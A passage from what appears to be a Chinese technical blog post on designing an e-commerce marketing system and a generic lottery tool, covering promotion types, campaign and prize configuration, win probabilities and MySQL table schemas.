<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"list"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"number, spu id"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"string, spu名称"</span>,</span><br><span class="line">                <span class="attr">"desc"</span>: <span class="string">"string, spu描述"</span>,</span><br><span class="line">                <span class="attr">"unit"</span>: <span class="string">"string, spu单位"</span>,</span><br><span class="line">                <span class="attr">"banner_url"</span>: [</span><br><span class="line">                    <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">                    <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">"price"</span>: <span class="string">"string, 售价"</span>,</span><br><span class="line">                <span class="attr">"market_price"</span>: <span class="string">"string, 市场价"</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="营销体系"><a href="#营销体系" class="headerlink" title="营销体系"></a>营销体系</h1><p>营销体系在一个电商系统中承担着尖刀般的作用，为电商团队拼下无数订单，就如同现实生活中的一线销售人员，引流、促销、提高成单率和客单价。</p>
<p>一个营销体系拥有各种提升GMV的手段，并且仍然在不断的推陈出新，着实令人敬佩。</p>
<h2 id="营销体系拆分"><a href="#营销体系拆分" class="headerlink" title="营销体系拆分"></a>营销体系拆分</h2><p>按照不同的维度，我们把营销体系划分为两大系统：</p>
<table>
<thead>
<tr>
<th>系统</th>
<th>描述</th>
<th>维度</th>
</tr>
</thead>
<tbody><tr>
<td>活动营销系统</td>
<td>拥有各种手段<strong>提升PV\UV</strong>，并引导消费</td>
<td>PV、UV维度</td>
</tr>
<tr>
<td>销售营销系统</td>
<td>拥有各种<strong>降低或变相降低价格</strong>的手段，来促进消费</td>
<td>价格维度</td>
</tr>
</tbody></table>
<ul>
<li>活动营销系统：<ul>
<li>抽奖<ul>
<li>按时间抽奖</li>
<li>按当前活动参与次数抽奖</li>
<li>按数额区间抽奖</li>
</ul>
</li>
<li>活动模板</li>
<li>抢购？？？</li>
</ul>
</li>
<li>销售营销系统：<ul>
<li>满减</li>
<li>满赠</li>
<li>买送</li>
<li>限时购(限时降价或限时折扣)</li>
<li>秒杀</li>
<li>加价购</li>
<li>多买</li>
<li>预售<ul>
<li>全款预售</li>
<li>定金(订金)膨胀预售</li>
<li>盲售</li>
</ul>
</li>
<li>拼团</li>
<li>砍价</li>
<li>众筹</li>
<li>组合套装</li>
</ul>
</li>
<li>营销体系的基础服务支撑:<ul>
<li>优惠券服务<ul>
<li>满减券</li>
<li>折扣券</li>
<li>现金券</li>
</ul>
</li>
<li>积分服务</li>
</ul>
</li>
</ul>
<h2 id="概念定义"><a href="#概念定义" class="headerlink" title="概念定义"></a>概念定义</h2><p>营销体系中我们需要把以下概念定义清楚，要使用哪些名词，以及明确其定义，防止沟通过程中的效率低下或理解偏差：</p>
<table>
<thead>
<tr>
<th>概念</th>
<th>定义</th>
</tr>
</thead>
<tbody><tr>
<td>抢购</td>
<td>爆品/新品发售场景</td>
</tr>
<tr>
<td>—</td>
<td>—</td>
</tr>
<tr>
<td>满减</td>
<td>单笔订单满多少减多少，例如，“满500减20”</td>
</tr>
<tr>
<td>满赠</td>
<td>单笔订单满多少增送其他商品，例如，“满999送秋裤”</td>
</tr>
<tr>
<td>买送</td>
<td>买就送，例如，“全场下单送秋裤”</td>
</tr>
<tr>
<td>限时购</td>
<td>限定时间区间，降价或折扣</td>
</tr>
<tr>
<td>秒杀</td>
<td>白送价格，数量极少的销售场景，例如，“一元秒杀”</td>
</tr>
<tr>
<td>加价购</td>
<td>再加多少钱，可以低价购买其他推荐商品</td>
</tr>
<tr>
<td>多买</td>
<td>单笔订单购买多个sku，享受折扣</td>
</tr>
<tr>
<td>全款预售</td>
<td>预售库存一次付清</td>
</tr>
<tr>
<td>订金膨胀预售</td>
<td>包含订金阶段、尾款阶段，订金翻倍抵现尾款，订金可退</td>
</tr>
<tr>
<td>定金膨胀预售</td>
<td>包含定金阶段、尾款阶段，定金翻倍抵现尾款，定金不退</td>
</tr>
<tr>
<td>盲售</td>
<td>包含订金(定金)阶段，尾款阶段；不知道尾款价格，不知道sku的具体信息，只知道spu的信息（可选）</td>
</tr>
<tr>
<td>拼团</td>
<td>限定时间凑够多人成功支付订单(享优惠价格)</td>
</tr>
<tr>
<td>砍价(点赞降价)</td>
<td>限定时间邀请好友砍价到指定金额</td>
</tr>
<tr>
<td>众筹</td>
<td>限定时间购买人数达到指定人数及以上即可成功享受优惠价格</td>
</tr>
<tr>
<td>组合套装</td>
<td>多个sku捆绑销售</td>
</tr>
<tr>
<td>—</td>
<td>—</td>
</tr>
<tr>
<td>满减券</td>
<td>单笔订单满多少才能使用的优惠券</td>
</tr>
<tr>
<td>折扣券</td>
<td>单笔订单折扣</td>
</tr>
<tr>
<td>现金券</td>
<td>单笔订单抵现金</td>
</tr>
</tbody></table>
<h1 id="通用抽奖工具-万能胶Glue"><a href="#通用抽奖工具-万能胶Glue" class="headerlink" title="通用抽奖工具(万能胶Glue)"></a>通用抽奖工具(万能胶Glue)</h1><h2 id="抽奖需求分析"><a href="#抽奖需求分析" class="headerlink" title="抽奖需求分析"></a>抽奖需求分析</h2><p>首先我们先来回顾下<strong>营销体系</strong>的组成：</p>
<table>
<thead>
<tr>
<th>营销体系</th>
</tr>
</thead>
<tbody><tr>
<td>活动营销系统</td>
</tr>
<tr>
<td>销售营销系统</td>
</tr>
</tbody></table>
<p>今天带来的是<strong>活动营销系统</strong>下的第一个独立子系统<strong>通用抽奖工具</strong>的介绍，本篇文章主要分为如下4部分：</p>
<ul>
<li>常见抽奖场景与归类</li>
<li>抽奖需求配置</li>
<li>常见奖品类型</li>
<li>抽奖五要素</li>
</ul>
<h2 id="常见抽奖场景与归类"><a href="#常见抽奖场景与归类" class="headerlink" title="常见抽奖场景与归类"></a>常见抽奖场景与归类</h2><p>下面是我列出来的一些常见的抽奖场景，红包雨、糖果雨、打地鼠、大转盘(九宫格)、考眼力、答题闯关、游戏闯关、支付刮刮乐、积分刮刮乐等等活动营销场景。</p>
<table>
<thead>
<tr>
<th>活动名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>红包雨</td>
<td>每日整点抢红包🧧抽奖，每个整点一般可参与一次</td>
</tr>
<tr>
<td>糖果雨</td>
<td>每日整点抢糖果🍬抽奖，每个整点一般可参与一次</td>
</tr>
<tr>
<td>打地鼠</td>
<td>每日整点打地鼠抽奖，每个整点一般可参与一次</td>
</tr>
<tr>
<td>大转盘(九宫格)</td>
<td>某个时间段，转盘抽奖，每个场一般可参N次</td>
</tr>
<tr>
<td>考眼力</td>
<td>某个时间段，旋转杯子猜小球在哪个被子里，猜对可抽奖，一般每日可参与N次</td>
</tr>
<tr>
<td>答题闯关</td>
<td>每过一关，可参与抽奖，越到后面奖品越贵重</td>
</tr>
<tr>
<td>游戏闯关</td>
<td>每过一关，可参与抽奖，越到后面奖品越贵重</td>
</tr>
<tr>
<td>支付刮刮乐</td>
<td>支付订单后可刮奖，支付金额越大奖品越贵重</td>
</tr>
<tr>
<td>积分刮刮乐</td>
<td>积分刮奖，消费积分额度越大奖品越贵重</td>
</tr>
</tbody></table>
<p>通过上面的活动描述，我们把整个抽奖场景归为以下三类：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>活动名称</th>
<th>维度</th>
</tr>
</thead>
<tbody><tr>
<td>按时间抽奖</td>
<td>红包雨、糖果雨、打地鼠、幸运大转盘(九宫格)、考眼力</td>
<td>时间维度</td>
</tr>
<tr>
<td>按抽奖次数抽奖</td>
<td>答题闯关、游戏闯关</td>
<td>参与该活动次数维度</td>
</tr>
<tr>
<td>按数额范围区间抽奖</td>
<td>支付刮刮乐、积分刮刮乐</td>
<td>数额区间维度</td>
</tr>
</tbody></table>
<p>接着我们来看下每类抽奖活动具体的抽奖需求配置。</p>
<h2 id="抽奖需求配置"><a href="#抽奖需求配置" class="headerlink" title="抽奖需求配置"></a>抽奖需求配置</h2><p>本小节每类抽奖活动的需求配置，分为如下三个部分：</p>
<ul>
<li>活动配置</li>
<li>场次配置</li>
<li>奖品配置</li>
</ul>
<h3 id="首先，第一类-按时间抽奖的需求配置"><a href="#首先，第一类-按时间抽奖的需求配置" class="headerlink" title="首先，第一类: 按时间抽奖的需求配置"></a>首先，第一类: <code>按时间抽奖</code>的需求配置</h3><table>
<thead>
<tr>
<th>类型</th>
<th>活动名称</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>按时间抽奖</td>
<td>红包雨、糖果雨、打地鼠、幸运大转盘(九宫格)、考眼力</td>
<td>时间维度</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>按时间抽奖</th>
<th>是否多场次</th>
<th>单场次次数限制(次)</th>
<th>总场次次数限制(次)</th>
</tr>
</thead>
<tbody><tr>
<td>红包雨</td>
<td>是</td>
<td>1</td>
<td>N</td>
</tr>
<tr>
<td>糖果雨</td>
<td>是</td>
<td>1</td>
<td>N</td>
</tr>
<tr>
<td>打地鼠</td>
<td>是</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td>幸运大转盘(九宫格)</td>
<td>否</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td>考眼力</td>
<td>否</td>
<td>N</td>
<td>N</td>
</tr>
</tbody></table>
<p>通过上面的分析我们得到了<strong>活动</strong>和<strong>场次</strong>的概念: 一个活动需要支持多场次的配置。</p>
<ul>
<li>活动activity:配置活动的日期范围</li>
<li>场次session:配置每场的具体时间范围</li>
</ul>
<p><strong>红包雨的需求配置示例：</strong></p>
<blockquote>
<p>活动特征：红包雨需要支持多场次。</p>
</blockquote>
<p>比如双十二期间三天、每天三场整点红包雨配置如下：</p>
<p>活动、场次配置：</p>
<table>
<thead>
<tr>
<th>双十二红包雨</th>
</tr>
</thead>
<tbody><tr>
<td>活动配置：</td>
</tr>
<tr>
<td>2019-12-10 至 2019-12-12</td>
</tr>
<tr>
<td>场次配置：</td>
</tr>
<tr>
<td>10:00:00 至 10:01:00</td>
</tr>
<tr>
<td>12:00:00 至 12:01:00</td>
</tr>
<tr>
<td>18:00:00 至 18:01:00</td>
</tr>
</tbody></table>
<p>奖品配置：</p>
<table>
<thead>
<tr>
<th>场次</th>
<th>奖品1</th>
<th>奖品2</th>
<th>—</th>
<th>奖品N</th>
</tr>
</thead>
<tbody><tr>
<td>场次10:00:00 至 10:01:00</td>
<td>优惠券2元</td>
<td>空奖</td>
<td>—</td>
<td>无</td>
</tr>
<tr>
<td>场次12:00:00 至 12:01:00</td>
<td>优惠券5元</td>
<td>空奖</td>
<td>—</td>
<td>无</td>
</tr>
<tr>
<td>场次18:00:00 至 18:01:00</td>
<td>优惠券10元</td>
<td>优惠券20元</td>
<td>—</td>
<td>空奖</td>
</tr>
</tbody></table>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">上面配置的结果如下：</span><br><span class="line"></span><br><span class="line">2019-12-10日三场整点红包雨：</span><br><span class="line">2019-12-10 10:00:00 ~ 10:01:00</span><br><span class="line">2019-12-10 12:00:00 ~ 12:01:00</span><br><span class="line">2019-12-10 18:00:00 ~ 18:01:00</span><br><span class="line"></span><br><span class="line">2019-12-11日三场整点红包雨：</span><br><span class="line">2019-12-11 10:00:00 ~ 10:01:00</span><br><span class="line">2019-12-11 12:00:00 ~ 12:01:00</span><br><span class="line">2019-12-11 18:00:00 ~ 18:01:00</span><br><span class="line"></span><br><span class="line">2019-12-12日三场整点红包雨：</span><br><span class="line">2019-12-12 10:00:00 ~ 10:01:00</span><br><span class="line">2019-12-12 12:00:00 ~ 12:01:00</span><br><span class="line">2019-12-12 18:00:00 ~ 18:01:00</span><br></pre></td></tr></table></figure>

<p><strong>幸运大转盘的需求配置示例：</strong></p>
<blockquote>
<p>活动特征：幸运大转盘不需要多场次。</p>
</blockquote>
<p>比如年货节2020-01-20 至 2020-02-10期间幸运大转盘配置如下：</p>
<p>活动、场次配置：</p>
<table>
<thead>
<tr>
<th>双十二幸运大转盘</th>
</tr>
</thead>
<tbody><tr>
<td>活动配置：</td>
</tr>
<tr>
<td>2019-12-10 至 2019-12-12</td>
</tr>
<tr>
<td>场次配置：</td>
</tr>
<tr>
<td>00:00:00 至 23:59:59</td>
</tr>
</tbody></table>
<p>奖品配置：</p>
<table>
<thead>
<tr>
<th>场次</th>
<th>奖品1</th>
<th>奖品2</th>
<th>—</th>
<th>奖品N</th>
</tr>
</thead>
<tbody><tr>
<td>场次00:00:00 至 23:59:59</td>
<td>优惠券2元</td>
<td>空奖</td>
<td>—</td>
<td>无</td>
</tr>
</tbody></table>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">上面配置的结果如下：</span><br><span class="line"></span><br><span class="line">幸运大转盘抽奖活动将于 2019-12-10 00:00:00 ~ 2019-12-12 23:59:59 进行</span><br></pre></td></tr></table></figure>

<p>注意与思考：双十二幸运大转盘不需要多个场次，只配置一个场次即可，完全复用活动场次模型。</p>
<h3 id="接着，第二类-按抽奖次数抽奖的需求配置"><a href="#接着，第二类-按抽奖次数抽奖的需求配置" class="headerlink" title="接着，第二类: 按抽奖次数抽奖的需求配置"></a>接着，第二类: <code>按抽奖次数抽奖</code>的需求配置</h3><table>
<thead>
<tr>
<th>类型</th>
<th>活动名称</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>按抽奖次数抽奖</td>
<td>答题闯关、游戏闯关</td>
<td>(成功参与)当前活动次数维度</td>
</tr>
</tbody></table>
<p><strong>答题闯关的需求配置示例：</strong></p>
<blockquote>
<p>活动特征：每一关的奖品不同，一般越到后面中大奖的几率越大。</p>
</blockquote>
<p>活动、场次配置：</p>
<table>
<thead>
<tr>
<th>双十二答题闯关</th>
</tr>
</thead>
<tbody><tr>
<td>活动配置：</td>
</tr>
<tr>
<td>2019-12-10 至 2019-12-12</td>
</tr>
<tr>
<td>场次配置：</td>
</tr>
<tr>
<td>00:00:00 至 23:59:59</td>
</tr>
</tbody></table>
<p>奖品配置：</p>
<table>
<thead>
<tr>
<th>双十二答题闯关</th>
<th>奖品</th>
</tr>
</thead>
<tbody><tr>
<td>第一关</td>
<td>优惠券2元</td>
</tr>
<tr>
<td>第二关</td>
<td>优惠券5元</td>
</tr>
<tr>
<td>第三关</td>
<td>优惠券10元</td>
</tr>
<tr>
<td>第四关</td>
<td>优惠券20元</td>
</tr>
<tr>
<td>第五关</td>
<td>优惠券50元</td>
</tr>
<tr>
<td>第六关</td>
<td>优惠券100元</td>
</tr>
</tbody></table>
<p>注意与思考：同理活动&amp;场次配置完全复用，同幸运大转盘配置(不需要支持多场次)。</p>
<h3 id="最后，第三类-按数额范围区间抽奖的需求配置："><a href="#最后，第三类-按数额范围区间抽奖的需求配置：" class="headerlink" title="最后，第三类: 按数额范围区间抽奖的需求配置："></a>最后，第三类: <code>按数额范围区间抽奖</code>的需求配置：</h3><table>
<thead>
<tr>
<th>类型</th>
<th>活动名称</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>按数额范围区间抽奖</td>
<td>支付刮刮乐、积分刮刮乐</td>
<td>数额区间维度</td>
</tr>
</tbody></table>
<p><strong>支付刮刮乐的需求配置示例：</strong></p>
<blockquote>
<p>活动特征：不同的订单金额，一般金额越大中大奖的几率越大。</p>
</blockquote>
<p>活动、场次配置:</p>
<table>
<thead>
<tr>
<th>双十二答题闯关</th>
</tr>
</thead>
<tbody><tr>
<td>活动配置：</td>
</tr>
<tr>
<td>2019-12-10 至 2019-12-12</td>
</tr>
<tr>
<td>场次配置：</td>
</tr>
<tr>
<td>00:00:00 至 23:59:59</td>
</tr>
</tbody></table>
<p>奖品配置：</p>
<table>
<thead>
<tr>
<th>订单金额</th>
<th>奖品1</th>
<th>奖品2</th>
<th>—</th>
<th>奖品N</th>
</tr>
</thead>
<tbody><tr>
<td>0~100</td>
<td>优惠券2元</td>
<td>空奖</td>
<td>—</td>
<td>无</td>
</tr>
<tr>
<td>100~200</td>
<td>优惠券5元</td>
<td>空奖</td>
<td>—</td>
<td>无</td>
</tr>
<tr>
<td>200~1000</td>
<td>优惠券10元</td>
<td>优惠券20元</td>
<td>—</td>
<td>空奖</td>
</tr>
<tr>
<td>1000以上</td>
<td>优惠券50元</td>
<td>笔记本电脑</td>
<td>—</td>
<td>空奖</td>
</tr>
</tbody></table>
<p>注意与思考：同理活动&amp;场次配置完全复用，同幸运大转盘配置(不需要支持多场次)。</p>
<blockquote>
<p>总结: 通过上面的分析我们得到了抽奖工具的两个要素<strong>活动</strong>和<strong>场次</strong>。</p>
</blockquote>
<h2 id="常见奖品类型"><a href="#常见奖品类型" class="headerlink" title="常见奖品类型"></a>常见奖品类型</h2><blockquote>
<p>抽奖抽什么？</p>
</blockquote>
<table>
<thead>
<tr>
<th>常见奖品类型</th>
</tr>
</thead>
<tbody><tr>
<td>优惠券</td>
</tr>
<tr>
<td>积分</td>
</tr>
<tr>
<td>实物</td>
</tr>
<tr>
<td>空奖</td>
</tr>
</tbody></table>
<blockquote>
<p>总结: 我们得到了抽奖工具的另一个要素<strong>奖品</strong>。</p>
</blockquote>
<h2 id="抽奖五要素"><a href="#抽奖五要素" class="headerlink" title="抽奖五要素"></a>抽奖五要素</h2><p>通过上面的分析我们已经得到了抽奖的<strong>三要素</strong></p>
<ul>
<li>活动 </li>
<li>场次 </li>
<li>奖品</li>
</ul>
<blockquote>
<p>那还有什么要素我们还没聊到呢？接下来来看。</p>
</blockquote>
<p><strong>第四要素：中奖概率</strong></p>
<p>抽奖自然离不开奖品的中奖概率的设置。关于中奖概率我们支持如下灵活的配置：</p>
<ol>
<li>手动设置奖品中奖概率</li>
<li>自动概率，根据当前奖品的数量、奖品的权重得到中奖概率</li>
</ol>
<p>比如我们某次大促活动红包雨的配置如下：</p>
<table>
<thead>
<tr>
<th>活动配置</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>活动时间</td>
<td>2019-12-10至2019-12-12</td>
</tr>
<tr>
<td>活动名称</td>
<td>2019双十二大促整点红包雨</td>
</tr>
<tr>
<td>活动描述</td>
<td>2019双十二大促全端整点红包雨活动</td>
</tr>
<tr>
<td>手动设置奖品概率</td>
<td>是</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>场次</th>
<th>奖品类型</th>
<th>具体奖品</th>
<th>奖品数量</th>
<th>中奖概率</th>
</tr>
</thead>
<tbody><tr>
<td>10:00:00 ~ 10:01:00</td>
<td>优惠券</td>
<td>2元优惠券</td>
<td>2000</td>
<td>50%</td>
</tr>
<tr>
<td>-</td>
<td>优惠券</td>
<td>5元优惠券</td>
<td>1000</td>
<td>20%</td>
</tr>
<tr>
<td>-</td>
<td>空奖</td>
<td>-</td>
<td>5000</td>
<td>30%</td>
</tr>
<tr>
<td>12:00:00 ~ 12:01:00</td>
<td>优惠券</td>
<td>2元优惠券</td>
<td>2000</td>
<td>50%</td>
</tr>
<tr>
<td>-</td>
<td>优惠券</td>
<td>5元优惠券</td>
<td>1000</td>
<td>20%</td>
</tr>
<tr>
<td>-</td>
<td>空奖</td>
<td>-</td>
<td>5000</td>
<td>30%</td>
</tr>
<tr>
<td>18:00:00 ~ 18:01:00</td>
<td>优惠券</td>
<td>2元优惠券</td>
<td>2000</td>
<td>50%</td>
</tr>
<tr>
<td>-</td>
<td>优惠券</td>
<td>5元优惠券</td>
<td>1000</td>
<td>20%</td>
</tr>
<tr>
<td>-</td>
<td>空奖</td>
<td>-</td>
<td>5000</td>
<td>30%</td>
</tr>
</tbody></table>
<p>备注：每轮场次中奖概率之和必须为100%，否则剩余部分默认添加为空奖的中奖概率。</p>
<p><strong>第五要素：均匀投奖</strong></p>
<blockquote>
<p>如何均匀的抽走奖品?</p>
</blockquote>
<p>答案: 均匀投奖。</p>
<p>具体方式为拆分总奖品数量，到各个细致具体的时间段。以双十二幸运大转盘为例：</p>
<table>
<thead>
<tr>
<th>场次</th>
<th>奖品类型</th>
<th>具体奖品</th>
<th>奖品数量</th>
<th>中奖概率</th>
<th>投奖时间(默认提前5分钟投奖)</th>
<th>投奖数量</th>
</tr>
</thead>
<tbody><tr>
<td>00:00:00 至 23:59:59</td>
<td>优惠券</td>
<td>2元优惠券</td>
<td>2000</td>
<td>50%</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>00:00:00</td>
<td>2000</td>
</tr>
<tr>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>06:00:00</td>
<td>2000</td>
</tr>
<tr>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>12:00:00</td>
<td>2000</td>
</tr>
<tr>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>18:00:00</td>
<td>2000</td>
</tr>
</tbody></table>
<p>这里我们就得到了抽奖的<strong>第五个要素：均匀投奖</strong>。</p>
<h2 id="需求总结"><a href="#需求总结" class="headerlink" title="需求总结"></a>需求总结</h2><p>通过上面的分析，我们得到抽奖五要素如下：</p>
<table>
<thead>
<tr>
<th>抽奖五要素</th>
<th>要素名称</th>
</tr>
</thead>
<tbody><tr>
<td>第一要素</td>
<td>活动</td>
</tr>
<tr>
<td>第二要素</td>
<td>场次</td>
</tr>
<tr>
<td>第三要素</td>
<td>奖品</td>
</tr>
<tr>
<td>第四要素</td>
<td>中奖概率</td>
</tr>
<tr>
<td>第五要素</td>
<td>均匀投奖</td>
</tr>
</tbody></table>
<p>同时我们通过<strong>抽奖五要素</strong>也得到了<strong>通用抽奖工具</strong>配置一场抽奖活动的5个基本步骤：</p>
<ol>
<li>活动配置</li>
<li>场次配置</li>
<li>奖品配置</li>
<li>奖品中奖概率配置</li>
<li>奖品投奖配置</li>
</ol>
<h2 id="通用抽奖工具系统设计"><a href="#通用抽奖工具系统设计" class="headerlink" title="通用抽奖工具系统设计"></a>通用抽奖工具系统设计</h2><p>需求已经分析完了，今天我们就来看看这通用抽奖工具具体的设计，分为如下三个部分：</p>
<ul>
<li>DB设计</li>
<li>配置后台设计</li>
<li>接口设计</li>
</ul>
<h2 id="DB设计"><a href="#DB设计" class="headerlink" title="DB设计"></a>DB设计</h2><p>第一要素<code>活动配置</code>的<code>抽奖活动表</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_activity 抽奖活动表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_activity`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'活动ID'</span>,</span><br><span class="line">    <span class="string">`serial_no`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'活动编号(md5值中间16位)'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'活动名称'</span>,</span><br><span class="line">    <span class="string">`description`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'活动描述'</span>,</span><br><span class="line">    <span class="string">`activity_type`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">COMMENT</span> <span class="string">'活动抽奖类型1: 按时间抽奖 2: 按抽奖次数抽奖 3:按数额范围区间抽奖'</span>,</span><br><span class="line">    <span class="string">`probability_type`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">COMMENT</span> <span class="string">'中奖概率类型1: static 2: dynamic'</span>,</span><br><span class="line">    <span class="string">`times_limit`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'抽奖次数限制，0默认不限制'</span>,</span><br><span class="line">    <span class="string">`start_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动开始时间'</span>,</span><br><span class="line">    <span class="string">`end_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动结束时间'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:disable, 1:enable'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖活动表'</span>;</span><br></pre></td></tr></table></figure>

<p>第二要素<code>场次配置</code>的<code>抽奖场次表</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_session 抽奖场次表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_session`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'场次ID'</span>,</span><br><span class="line">    <span class="string">`activity_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动ID'</span>,</span><br><span class="line">    <span class="string">`times_limit`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'抽奖次数限制，0默认不限制'</span>,</span><br><span class="line">    <span class="string">`start_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次开始时间'</span>,</span><br><span class="line">    <span class="string">`end_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次结束时间'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span 